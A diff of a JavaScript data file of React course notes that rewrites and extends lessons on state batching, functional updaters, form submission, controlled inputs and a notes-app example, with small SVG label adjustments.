        ═══════════════════════════════════════════════════════════════ */
     {
       id: "react-26-batch-updates-functional-state",
       number: "26",
-      shortLabel: "Batch Updates & Functional Setters",
+      shortLabel: "Batch Updates & Functional State",
       title: "Batch Updates in React (num + 1 vs. prev => prev + 1)",
-      summary: "React automatic batching mechanics, why multiple setNum(num + 1) calls collapse into one, and fixing updates with updater functions (prev => prev + 1).",
-      subtopicLabels: ["26.1 Batching Mechanics", "26.2 Functional State Updaters"],
+      summary: "React 18 automatic batching mechanics, why multiple setState calls collapse to a single render, the stale closure trap, and solving concurrency with functional updater callbacks.",
+      subtopicLabels: ["26.1 React 18 Automatic Batching", "26.2 Direct Mutation vs Functional Updater", "26.3 State Update Queue Mechanics"],
       diagramCount: 2,
       sections: [
         {
           num: "26.1",
-          title: "Why Calling setNum(num + 1) Three Times Only Increments by 1",
+          title: "React 18 Automatic Batching Mechanics",
           content: `
+            <p>
+              In high-performance user interfaces, re-rendering the DOM is computationally expensive. If a click handler updates three different pieces of state, re-rendering the entire component tree three distinct times would cause visible frame drops and severe UI jank.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Batching Puzzle:</strong>
+              <li><strong>What is Batching?</strong>
                 <ul class="notes-sub-list">
-                  <li>If you call <code>setNum(num + 1)</code> three times sequentially inside a single click handler, you might expect <code>10</code> to jump to <code>13</code>.</li>
-                  <li><strong>What Actually Happens:</strong> The counter only increments from <strong><code>10</code> to <code>11</code></strong>!</li>
+                  <li>Batching is React's optimization strategy where multiple state updates are grouped into a single re-render pass for optimal performance.</li>
+                  <li>Think of it like a restaurant waiter: the waiter does not sprint to the kitchen with one dish order, run back to the table, and repeat for every customer. Instead, the waiter gathers everyone's orders together and delivers them to the chef in a single trip.</li>
                 </ul>
               </li>
-              <li><strong>Why This Happens (Automatic Batching):</strong>
+              <li><strong>React 18 Universal Batching:</strong>
                 <ul class="notes-sub-list">
-                  <li>To prevent excessive layout recalculations, React groups multiple state setter calls into a single batch update.</li>
-                  <li>During this render pass, the variable <code>num</code> is still closed over as <code>10</code>. All three statements compute <code>10 + 1 = 11</code> and assign <code>11</code>:</li>
+                  <li>Before React 18, React only batched updates inside native React event handlers (like <code>onClick</code>). Updates inside <code>fetch()</code> promises, <code>setTimeout</code>, or native DOM listeners were not batched.</li>
+                  <li>In React 18+, <strong>Automatic Batching</strong> is enabled everywhere by default—inside event handlers, async promises, timeouts, and native callbacks alike!</li>
                 </ul>
               </li>
             </ul>
-
-            <pre class="notes-code-block"><code>const [num, setNum] = useState(10)
-
-const btnClicked = () => {
-  setNum(num + 1) // setNum(10 + 1)
-  setNum(num + 1) // setNum(10 + 1)
-  setNum(num + 1) // setNum(10 + 1)
-  // Clicking once updates 10 -> 11 (NOT 13!)
-}</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -5392,45 +5602,48 @@ const btnClicked = () => {
         },
         {
           num: "26.2",
-          title: "Fixing Batch Updates With prev => prev + 1",
+          title: "The Triple setNum(num + 1) Trap vs. Functional Updaters",
           content: `
+            <p>
+              Consider this classic React interview question:
+            </p>
+
+            <pre class="notes-code-block"><code>const [num, setNum] = useState(0);
+
+const handleTripleClick = () => {
+  setNum(num + 1);
+  setNum(num + 1);
+  setNum(num + 1);
+};</code></pre>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Solution — Functional State Updaters:</strong>
+              <li><strong>What will <code>num</code> be after one click?</strong>
                 <ul class="notes-sub-list">
-                  <li>Instead of passing a static value, pass an <strong>updater callback function</strong>: <code>setNum(prev =&gt; prev + 1)</code>.</li>
-                  <li>React places these callback functions in a pending execution queue. Each callback receives the <strong>latest resolved value from the previous updater</strong>:
-                    <ul class="notes-sub-list">
-                      <li>Call 1: receives <code>10</code> → returns <code>11</code></li>
-                      <li>Call 2: receives <code>11</code> → returns <code>12</code></li>
-                      <li>Call 3: receives <code>12</code> → returns <code>13</code></li>
-                    </ul>
+                  <li>Most beginners guess <code>3</code>. In reality, the result is <strong><code>1</code></strong>!</li>
+                </ul>
+              </li>
+              <li><strong>Why Does It Collapse to 1? (The Stale Closure Trap):</strong>
+                <ul class="notes-sub-list">
+                  <li>During the execution of <code>handleTripleClick</code>, the component has not yet re-rendered. The variable <code>num</code> is frozen at <code>0</code> throughout the entire function.</li>
+                  <li>Line 1 translates to: <code>setNum(0 + 1)</code> &rarr; requests next state to be <code>1</code>.</li>
+                  <li>Line 2 translates to: <code>setNum(0 + 1)</code> &rarr; requests next state to be <code>1</code>.</li>
+                  <li>Line 3 translates to: <code>setNum(0 + 1)</code> &rarr; requests next state to be <code>1</code>.</li>
+                  <li>React finishes the batch and re-renders with <code>1</code>!</li>
+                </ul>
+              </li>
+              <li><strong>The Solution — Functional Updater (<code>prev =&gt; prev + 1</code>):</strong>
+                <ul class="notes-sub-list">
+                  <li>Instead of passing a raw value, pass a callback function to the setter:
+                    <pre class="notes-code-block"><code>const handleTripleClick = () => {
+  setNum(prev => prev + 1);
+  setNum(prev => prev + 1);
+  setNum(prev => prev + 1);
+};</code></pre>
                   </li>
-                  <li><strong>Result:</strong> Clicking once cleanly jumps <strong><code>10 -&gt; 13</code></strong>!</li>
+                  <li>Now, the result is guaranteed to be <strong><code>3</code></strong>!</li>
                 </ul>
               </li>
             </ul>
-
-            <pre class="notes-code-block"><code>import React, { useState } from 'react'
-
-const App = () => {
-  const [num, setNum] = useState(10)
-
-  const btnClicked = () => {
-    setNum(prev => prev + 1)
-    setNum(prev => prev + 1)
-    setNum(prev => prev + 1)
-    // Clicking once updates 10 -> 13!
-  }
-
-  return (
-    <div>
-      <h1>{num}</h1>
-      <button onClick={btnClicked}>click</button>
-    </div>
-  )
-}
-
-export default App</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -5490,12 +5703,42 @@ export default App</code></pre>
               </div>
             </figure>
           `
+        },
+        {
+          num: "26.3",
+          title: "State Update Queue Mechanics in the React Fiber Engine",
+          content: `
+            <p>
+              How does React process functional updaters under the hood?
+            </p>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The Fiber Update Queue:</strong>
+                <ul class="notes-sub-list">
+                  <li>Inside the component's Fiber node, React maintains an <strong>Update Queue</strong>.</li>
+                  <li>When you pass a function <code>prev =&gt; prev + 1</code>, React pushes the function onto this queue instead of resolving a static value.</li>
+                  <li>During reconciliation, React processes the queue sequentially:
+                    <br>&bull; Initial state: <code>0</code>
+                    <br>&bull; Queue item 1: <code>0 =&gt; 0 + 1 = 1</code>
+                    <br>&bull; Queue item 2: <code>1 =&gt; 1 + 1 = 2</code> (receives result of item 1!)
+                    <br>&bull; Queue item 3: <code>2 =&gt; 2 + 1 = 3</code> (receives result of item 2!)
+                    <br>&bull; Final committed state: <strong><code>3</code></strong> &check;
+                  </li>
+                </ul>
+              </li>
+              <li><strong>Production Engineering Best Practice:</strong>
+                <ul class="notes-sub-list">
+                  <li>Whenever your next state depends directly on the previous state (counters, toggling booleans, appending to arrays), <strong>always use the functional updater form</strong> (<code>setVal(prev =&gt; !prev)</code>). It guarantees mathematical accuracy and prevents stale state concurrency bugs!</li>
+                </ul>
+              </li>
+            </ul>
+          `
         }
       ]
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 27: FORM HANDLING IN REACT (ONSUBMIT & E.PREVENTDEFAULT())
+       TOPIC 27
        ═══════════════════════════════════════════════════════════════ */
     {
       id: "react-27-form-handling-prevent-default",
@@ -5503,7 +5746,7 @@ export default App</code></pre>
       shortLabel: "Form Handling & preventDefault",
       title: "Form Handling in React (onSubmit & e.preventDefault())",
       summary: "Default HTML form POST behavior and page reload flaw, capturing submit events via onSubmit, and keeping the SPA alive with e.preventDefault().",
-      subtopicLabels: ["27.1 The Page Reload Problem", "27.2 Preventing Reloads with e.preventDefault()"],
+      subtopicLabels: ["27.1 The Page Reload Problem", "27.2 Preventing Reloads with e.preventDefault()", "27.3 Production Validation & Keyboard Accessibility"],
       diagramCount: 2,
       sections: [
         {
@@ -5528,8 +5771,8 @@ export default App</code></pre>
                 <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="Diagram showing default HTML form submission triggering full page reload and wiping SPA state">
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="395" height="180" rx="10" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="160" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
-                    <text x="95" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">DEFAULT BROWSER FORM ❌</text>
+                    <rect x="15" y="15" width="189" height="20" rx="4" fill="var(--danger-bg)" stroke="var(--danger)" stroke-width="1.2"/>
+                    <text x="109.5" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--danger); font-weight:700;">DEFAULT BROWSER FORM ❌</text>
                     <text x="200" y="56" text-anchor="middle" class="svg-title" style="fill:var(--danger);">Hard Page Reload Triggered</text>
 
                     <rect x="15" y="70" width="365" height="88" rx="6" fill="var(--bg-surface)" stroke="var(--danger)"/>
@@ -5633,6 +5876,107 @@ export default App</code></pre>
               </div>
             </figure>
           `
+        },
+        {
+          num: "27.3",
+          title: "Production Form Validation, FormData API & Keyboard Accessibility",
+          content: `
+            <p>
+              Handling form submissions in professional web applications goes beyond calling <code>e.preventDefault()</code>. Production engineers follow strict patterns for accessibility, input validation, and double-submit prevention.
+            </p>
+
+            <ul class="notes-bullet-list">
+              <li><strong>Keyboard Accessibility (<kbd>Enter</kbd> Key Submit):</strong>
+                <ul class="notes-sub-list">
+                  <li>Always attach your submit listener to <code>&lt;form onSubmit={handleSubmit}&gt;</code>, NEVER to the button's <code>onClick</code>.</li>
+                  <li>Attaching to <code>&lt;form&gt;</code> ensures that pressing <kbd>Enter</kbd> inside any input field will naturally submit the form, which is critical for screen readers and keyboard-only users.</li>
+                </ul>
+              </li>
+              <li><strong>Double-Submit Prevention (Debouncing & Disabled State):</strong>
+                <ul class="notes-sub-list">
+                  <li>Users frequently double-click or spam the submit button, which could trigger duplicate charges or duplicate database records.</li>
+                  <li>Always declare an <code>isSubmitting</code> state flag: disable the submit button and show a spinner while the asynchronous request is pending!</li>
+                </ul>
+              </li>
+              <li><strong>The Modern <code>FormData</code> Alternative:</strong>
+                <ul class="notes-sub-list">
+                  <li>For large forms where you don't need real-time per-keystroke validation, you can extract all form inputs cleanly on submission using the native <code>FormData</code> API:</li>
+                </ul>
+              </li>
+            </ul>
+
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
+
+function ContactForm() {
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [statusMsg, setStatusMsg] = useState(null);
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    setStatusMsg(null);
+
+    // Extract all named inputs via native FormData API:
+    const formData = new FormData(e.currentTarget);
+    const payload = Object.fromEntries(formData.entries());
+
+    // Defensive client-side validation
+    if (!payload.email || !payload.email.includes('@')) {
+      alert('Please enter a valid email address!');
+      setIsSubmitting(false);
+      return;
+    }
+
+    try {
+      // Simulate API dispatch
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      setStatusMsg('Thank you! Your message has been received.');
+      e.target.reset(); // Native form field reset
+    } catch (err) {
+      setStatusMsg('Submission failed. Please try again.');
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  return (
+    &lt;form onSubmit={handleSubmit} className="p-6 max-w-md mx-auto bg-card border rounded-xl space-y-4"&gt;
+      &lt;h3 className="text-lg font-bold"&gt;Contact Support&lt;/h3&gt;
+      &lt;input 
+        name="fullName" 
+        type="text" 
+        placeholder="Full Name" 
+        required 
+        className="w-full border p-2 rounded" 
+      /&gt;
+      &lt;input 
+        name="email" 
+        type="email" 
+        placeholder="Email Address" 
+        required 
+        className="w-full border p-2 rounded" 
+      /&gt;
+      &lt;textarea 
+        name="message" 
+        placeholder="How can we help?" 
+        required 
+        rows={3} 
+        className="w-full border p-2 rounded" 
+      /&gt;
+      &lt;button 
+        type="submit" 
+        disabled={isSubmitting}
+        className="w-full py-2 bg-emerald-600 text-white rounded font-bold disabled:opacity-50 transition"
+      &gt;
+        {isSubmitting ? 'Sending Message...' : 'Submit Form'}
+      &lt;/button&gt;
+      {statusMsg && &lt;p className="text-sm font-semibold text-emerald-600"&gt;{statusMsg}&lt;/p&gt;}
+    &lt;/form&gt;
+  );
+}
+
+export default ContactForm;</code></pre>
+          `
         }
       ]
     },
@@ -5645,25 +5989,29 @@ export default App</code></pre>
       number: "28",
       shortLabel: "Two-Way Binding & Controlled Inputs",
       title: "Two-Way Binding in React (Controlled Inputs: Value & onChange)",
-      summary: "The 'Ek Teer Se Do Nishane' analogy, bidirectional sync between state and input (value={title} + onChange), and programmatic input clearing on submit.",
-      subtopicLabels: ["28.1 Two-Way Binding Architecture", "28.2 Controlled Input & Auto-Reset Pattern"],
+      summary: "Controlled vs. uncontrolled inputs, establishing a single source of truth between React state and the DOM input element, and handling multi-input forms with computed keys.",
+      subtopicLabels: ["28.1 Controlled vs Uncontrolled Components", "28.2 The Two-Way Binding Feedback Loop", "28.3 Dynamic Computed Form Handlers"],
       diagramCount: 2,
       sections: [
         {
           num: "28.1",
-          title: "What Is Two-Way Binding & How It Works",
+          title: "Controlled vs. Uncontrolled Components (Single Source of Truth)",
           content: `
+            <p>
+              In traditional HTML forms, the physical DOM node manages its own internal state. When a user types into an <code>&lt;input&gt;</code>, the browser stores and displays that text directly inside the input element. This is known as an <strong>Uncontrolled Component</strong>.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Analogy: "Ek Teer Se Do Nishane" (Dual Control):</strong>
+              <li><strong>The Uncontrolled Model & Its Limits:</strong>
                 <ul class="notes-sub-list">
-                  <li>In traditional web forms, the DOM input stores its own private text, and React has no real-time awareness of what the user is typing.</li>
-                  <li><strong>Two-Way Binding (Controlled Component):</strong> Creates a seamless bidirectional loop between React state and the DOM input element:
-                    <ul class="notes-sub-list">
-                      <li><strong>Direction 1 (State → Input):</strong> <code>value={title}</code> locks the text displayed in the input to whatever string is stored in the <code>title</code> state variable.</li>
-                      <li><strong>Direction 2 (Input → State):</strong> Every keystroke triggers <code>onChange</code>, reads <code>e.target.value</code>, and updates <code>setTitle(e.target.value)</code>.</li>
-                    </ul>
-                  </li>
-                  <li><strong>Why Both Are Mandatory:</strong> If you attach <code>value={title}</code> without <code>onChange</code>, the input box is locked and user keystrokes cannot change anything!</li>
+                  <li>In an uncontrolled setup, React has no knowledge of what the user is typing until the form is submitted and you read values via refs (<code>inputRef.current.value</code>).</li>
+                  <li>You cannot implement instant validation, character countdowns, conditional disabled buttons, or input masking cleanly.</li>
+                </ul>
+              </li>
+              <li><strong>The Controlled Component Architecture:</strong>
+                <ul class="notes-sub-list">
+                  <li>In a <strong>Controlled Component</strong>, the React state variable serves as the <strong>Single Source of Truth</strong>.</li>
+                  <li>The DOM input element is stripped of its internal authority: its displayed text is driven 100% by React's <code>value</code> prop, and any attempt by the user to type is intercepted by <code>onChange</code> to update React state.</li>
                 </ul>
               </li>
             </ul>
@@ -5721,49 +6069,42 @@ export default App</code></pre>
         },
         {
           num: "28.2",
-          title: "Binding value={title}, onChange & Clearing Input on Submit",
+          title: "The Two-Way Binding Feedback Loop Mechanics",
           content: `
+            <p>
+              Two-way data binding in React is not automatic "magic" (like in AngularJS or Vue); it is an explicit, circular 2-step feedback pipeline:
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Auto-Reset Feature:</strong>
-                <ul class="notes-sub-list">
-                  <li>Because React owns the input value, resetting the field after submission is effortless: simply call <strong><code>setTitle('')</code></strong> inside <code>submitHandler</code>.</li>
-                  <li>The input box clears instantly on screen with zero DOM querying!</li>
-                </ul>
-              </li>
+              <li><strong>Step 1 (View &rarr; State):</strong> The user presses a key on their keyboard. The browser fires an <code>input</code> event. React intercepts this via <code>onChange</code>, extracts <code>e.target.value</code>, and calls <code>setState(e.target.value)</code>.</li>
+              <li><strong>Step 2 (State &rarr; View):</strong> React enqueues the state update, re-renders the component, and feeds the updated state string directly into the <code>value={state}</code> prop. The browser DOM element displays the text requested by React!</li>
+              <li><strong>The "Read-Only" Trap:</strong> If you pass <code>value={name}</code> without an <code>onChange</code> handler, React will lock the input! You will press keys on your keyboard and literally nothing will appear on screen, because React continuously re-asserts the original state value. React will warn in the console: <code>Warning: You provided a 'value' prop to a form field without an 'onChange' handler.</code></li>
             </ul>
 
-            <pre class="notes-code-block"><code>import React, { useState } from 'react'
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
 
-const App = () => {
-  const [title, setTitle] = useState('')
-
-  const submitHandler = (e) => {
-    e.preventDefault()
-    console.log('Form Submitted by', title)
-
-    setTitle('') // Automatically clears input!
-  }
+function ControlledInput() {
+  const [email, setEmail] = useState('');
 
   return (
-    <div>
-      <form onSubmit={(e) => {
-        submitHandler(e)
-      }}>
-        <input
-          type="text"
-          placeholder="Enter your name"
-          value={title}
-          onChange={(e) => {
-            setTitle(e.target.value)
-          }}
-        />
-        <button>Submit</button>
-      </form>
-    </div>
-  )
+    &lt;div className="p-4"&gt;
+      &lt;label className="block text-xs font-semibold uppercase mb-1"&gt;User Email&lt;/label&gt;
+      {/* Both value and onChange are strictly bound together */}
+      &lt;input 
+        type="email"
+        value={email}
+        onChange={(e) => setEmail(e.target.value)}
+        placeholder="Enter your email address"
+        className="border px-3 py-2 rounded w-full focus:ring-2 focus:ring-emerald-500"
+      /&gt;
+      &lt;p className="mt-1 text-xs text-text-muted"&gt;
+        Characters typed: {email.length}
+      &lt;/p&gt;
+    &lt;/div&gt;
+  );
 }
 
-export default App</code></pre>
+export default ControlledInput;</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -5775,8 +6116,8 @@ export default App</code></pre>
                   <!-- Step 1: Keystroke to State -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="255" height="170" rx="8" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
-                    <rect x="15" y="12" width="130" height="18" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="80" y="25" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">DIRECTION 1: INPUT → STATE</text>
+                    <rect x="15" y="12" width="219" height="18" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="124.5" y="25" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">DIRECTION 1: INPUT → STATE</text>
                     <text x="127" y="50" text-anchor="middle" class="svg-title">User Keystroke</text>
                     <rect x="15" y="64" width="225" height="90" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                     <text x="25" y="86" class="svg-mono-xs">1. User types in &lt;input /&gt;</text>
@@ -5808,8 +6149,8 @@ export default App</code></pre>
                   <!-- Step 3: Programmatic Reset -->
                   <g transform="translate(605, 20)">
                     <rect x="0" y="0" width="250" height="170" rx="8" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="12" width="135" height="18" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="82" y="25" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">FORM SUBMIT &amp; RESET</text>
+                    <rect x="15" y="12" width="167" height="18" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="98.5" y="25" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">FORM SUBMIT &amp; RESET</text>
                     <text x="125" y="50" text-anchor="middle" class="svg-title" style="fill:var(--success);">Auto-Reset Pattern</text>
                     <rect x="15" y="64" width="220" height="90" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                     <text x="25" y="86" class="svg-mono-xs">submitHandler(e):</text>
@@ -5821,38 +6162,75 @@ export default App</code></pre>
               </div>
             </figure>
           `
+        },
+        {
+          num: "28.3",
+          title: "Dynamic Multi-Input Form Handling via Computed Property Names",
+          content: `
+            <p>
+              What if your form has 10 different input fields? Creating 10 separate <code>useState</code> hooks (<code>name</code>, <code>email</code>, <code>phone</code>, <code>city</code>...) creates messy, repetitive boilerplate.
+            </p>
+
+            <ul class="notes-bullet-list">
+              <li><strong>The Senior Pattern — Unified Form Object State:</strong>
+                <ul class="notes-sub-list">
+                  <li>Store the entire form inside a single object state:
+                    <pre class="notes-code-block"><code>const [formData, setFormData] = useState({
+  fullName: '',
+  email: '',
+  role: 'Developer'
+});</code></pre>
+                  </li>
+                  <li>Give each <code>&lt;input&gt;</code> a <code>name</code> attribute that matches the object key exactly:
+                    <br><code>&lt;input name="fullName" value={formData.fullName} onChange={handleChange} /&gt;</code>
+                  </li>
+                  <li>Use ES6 <strong>Computed Property Names</strong> (<code>[e.target.name]</code>) in a single, reusable change handler:
+                    <pre class="notes-code-block"><code>const handleChange = (e) => {
+  const { name, value } = e.target;
+  setFormData(prev => ({
+    ...prev,
+    [name]: value // Dynamically updates 'fullName', 'email', etc.
+  }));
+};</code></pre>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          `
         }
       ]
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 29: BUILDING THE NOTES APP — STATE SETUP & ADDING NOTES
+       TOPIC 29
        ═══════════════════════════════════════════════════════════════ */
     {
-      id: "react-29-building-notes-app-adding-notes",
+      id: "react-29-notes-app-state-setup-adding",
       number: "29",
-      shortLabel: "Notes App: State & Adding Notes",
+      shortLabel: "Building Notes App — State Setup",
       title: "Building the Notes App — State Setup, Two-Way Binding & Adding Notes",
-      summary: "Full-stack frontend architecture of 08-notes-app, three useState hooks (title, details, task), immutable note creation with copyTask, and auto-resetting form fields.",
-      subtopicLabels: ["29.1 Architecture & State Triad", "29.2 Immutable Note Creation & Reset"],
+      summary: "Practical full-flow project architecture: separating form state from list state, handling submission validation, pure immutable array insertion, and resetting form inputs.",
+      subtopicLabels: ["29.1 Architecture & Separation of Concerns", "29.2 Immutable Insertion & Input Reset"],
       diagramCount: 2,
       sections: [
         {
           num: "29.1",
-          title: "Project Architecture & Three State Variables (title, details, task)",
+          title: "Architecture & Separation of Concerns (Form State vs. List State)",
           content: `
+            <p>
+              When building dynamic CRUD applications (like note-taking apps, task boards, or issue trackers), clean architecture starts with segregating <strong>transient input state</strong> from <strong>persisted list state</strong>.
+            </p>
+
             <ul class="notes-bullet-list">
-              <li><strong>The Mobile-First Responsive Layout:</strong>
+              <li><strong>The Two State Pillars:</strong>
                 <ul class="notes-sub-list">
-                  <li><strong>Left Section (Add Notes Form):</strong> A controlled <code>&lt;form&gt;</code> containing an <code>&lt;input&gt;</code> for heading, a <code>&lt;textarea&gt;</code> for detailed notes, and a submit button.</li>
-                  <li><strong>Right Section (Recent Notes Feed):</strong> Separated on desktop screens by <code>lg:border-l-2</code> with a scrollable flexbox container (<code>overflow-auto h-[90%]</code>) displaying sticky-note cards.</li>
+                  <li><strong>1. Transient Form State:</strong> Holds the raw, temporary values currently typed into the inputs (e.g. <code>title</code> and <code>content</code>). Once submitted, this data is transferred to the main collection and cleared.</li>
+                  <li><strong>2. Collection List State:</strong> An array of structured note objects (e.g. <code>notes = [{ id, title, content, createdAt }]</code>) that persists throughout the user session and renders the cards grid.</li>
                 </ul>
               </li>
-              <li><strong>The Three Core State Variables:</strong>
+              <li><strong>Why Keep Them Separate?</strong>
                 <ul class="notes-sub-list">
-                  <li><code>const [title, setTitle] = useState('')</code> → Stores live heading input.</li>
-                  <li><code>const [details, setDetails] = useState('')</code> → Stores live textarea body.</li>
-                  <li><code>const [task, setTask] = useState([])</code> → Stores the master <strong>Array of Note Objects</strong>: <code>[{ title: '...', details: '...' }]</code>.</li>
+                  <li>Separating them ensures that typing in an input field does not re-compute or mutate the historical notes list until the user explicitly commits the submission.</li>
                 </ul>
               </li>
             </ul>
@@ -5867,8 +6245,8 @@ export default App</code></pre>
                   <!-- Left Form -->
                   <g transform="translate(25, 20)">
                     <rect x="0" y="0" width="380" height="190" rx="12" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="140" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
-                    <text x="85" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">LEFT: FORM PANEL</text>
+                    <rect x="15" y="15" width="145" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
+                    <text x="87.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">LEFT: FORM PANEL</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title">Controlled Input State</text>
 
                     <rect x="15" y="74" width="350" height="40" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
@@ -5888,8 +6266,8 @@ export default App</code></pre>
                   <!-- Right Feed -->
                   <g transform="translate(480, 20)">
                     <rect x="0" y="0" width="375" height="190" rx="12" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
-                    <rect x="15" y="15" width="160" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
-                    <text x="95" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">RIGHT: RECENT NOTES</text>
+                    <rect x="15" y="15" width="167" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
+                    <text x="98.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">RIGHT: RECENT NOTES</text>
                     <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">task Master Array</text>
 
                     <rect x="15" y="74" width="345" height="96" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
@@ -5905,19 +6283,88 @@ export default App</code></pre>
         },
         {
           num: "29.2",
-          title: "Adding Notes Immutably With copyTask & Resetting Inputs",
+          title: "Immutable Insertion & Clean Form Reset Implementation",
           content: `
-            <ul class="notes-bullet-list">
-              <li><strong>The 5-Step Immutable Submission Workflow:</strong>
-                <ul class="notes-sub-list">
-                  <li><strong>1. <code>e.preventDefault()</code>:</strong> Stops page reload.</li>
-                  <li><strong>2. <code>const copyTask = [...task]</code>:</strong> Clones existing array.</li>
-                  <li><strong>3. <code>copyTask.push({ title, details })</code>:</strong> Appends new note object.</li>
-                  <li><strong>4. <code>setTask(copyTask)</code>:</strong> Saves new array reference to state.</li>
-                  <li><strong>5. <code>setTitle('')</code> & <code>setDetails('')</code>:</strong> Clears both inputs automatically via two-way binding.</li>
-                </ul>
-              </li>
-            </ul>
+            <p>
+              Here is the production-grade implementation of the Notes creation pipeline, featuring defensive input trimming, immutable state expansion, and instant form resetting:
+            </p>
+
+            <pre class="notes-code-block"><code>import React, { useState } from 'react';
+
+function NotesApp() {
+  // 1. Transient form state
+  const [title, setTitle] = useState('');
+  const [content, setContent] = useState('');
+
+  // 2. Collection list state (Array of note objects)
+  const [notes, setNotes] = useState([
+    { id: 1, title: 'React Fiber', content: 'Fiber enables incremental virtual DOM rendering.' }
+  ]);
+
+  const handleSubmit = (e) => {
+    e.preventDefault(); // Stop full-page reload
+
+    // Defensive guard: prevent blank note creation
+    if (!title.trim() || !content.trim()) {
+      alert('Please fill out both the title and content fields!');
+      return;
+    }
+
+    // Create structured note item with timestamp
+    const newNote = {
+      id: Date.now(), // Unique identifier
+      title: title.trim(),
+      content: content.trim(),
+      createdAt: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+    };
+
+    // Pure immutable state update: prepend new note to array
+    setNotes(prevNotes => [newNote, ...prevNotes]);
+
+    // Clean form reset
+    setTitle('');
+    setContent('');
+  };
+
+  return (
+    &lt;div className="max-w-4xl mx-auto p-6 grid grid-cols-1 md:grid-cols-2 gap-8"&gt;
+      {/* Left Column: Form Panel */}
+      &lt;div className="p-6 bg-card border rounded-xl shadow-sm"&gt;
+        &lt;h3 className="text-lg font-bold mb-4"&gt;Create New Note&lt;/h3&gt;
+        &lt;form onSubmit={handleSubmit} className="flex flex-col gap-4"&gt;
+          &lt;input 
+            type="text"
+            placeholder="Note Title"
+            value={title}
+            onChange={(e) => setTitle(e.target.value)}
+            className="border p-2.5 rounded font-medium focus:ring-2 focus:ring-emerald-500"
+          /&gt;
+          &lt;textarea 
+            placeholder="Write your note contents..."
+            value={content}
+            onChange={(e) => setContent(e.target.value)}
+            rows={4}
+            className="border p-2.5 rounded resize-none focus:ring-2 focus:ring-emerald-500"
+          /&gt;
+          &lt;button 
+            type="submit"
+            className="bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-2.5 rounded transition"
+          &gt;
+            Add Note Card
+          &lt;/button&gt;
+        &lt;/form&gt;
+      &lt;/div&gt;
+
+      {/* Right Column: Active Count */}
+      &lt;div className="flex flex-col justify-center items-center p-6 bg-surface border rounded-xl"&gt;
+        &lt;span className="text-4xl font-mono font-bold text-emerald-600"&gt;{notes.length}&lt;/span&gt;
+        &lt;span className="text-sm text-text-muted mt-1 uppercase tracking-wide"&gt;Total Active Notes&lt;/span&gt;
+      &lt;/div&gt;
+    &lt;/div&gt;
+  );
+}
+
+export default NotesApp;</code></pre>
 
             <figure class="diagram-frame">
               <div class="diagram-frame-header">
@@ -5991,37 +6438,32 @@ export default App</code></pre>
     },
 
     /* ═══════════════════════════════════════════════════════════════
-       TOPIC 30: RENDERING NOTE CARDS & DELETING NOTES WITH SPLICE
+       TOPIC 30
        ═══════════════════════════════════════════════════════════════ */
     {
-      id: "react-30-rendering-deleting-notes-splice",
+      id: "react-30-rendering-notes-deleting-splice",
       number: "30",
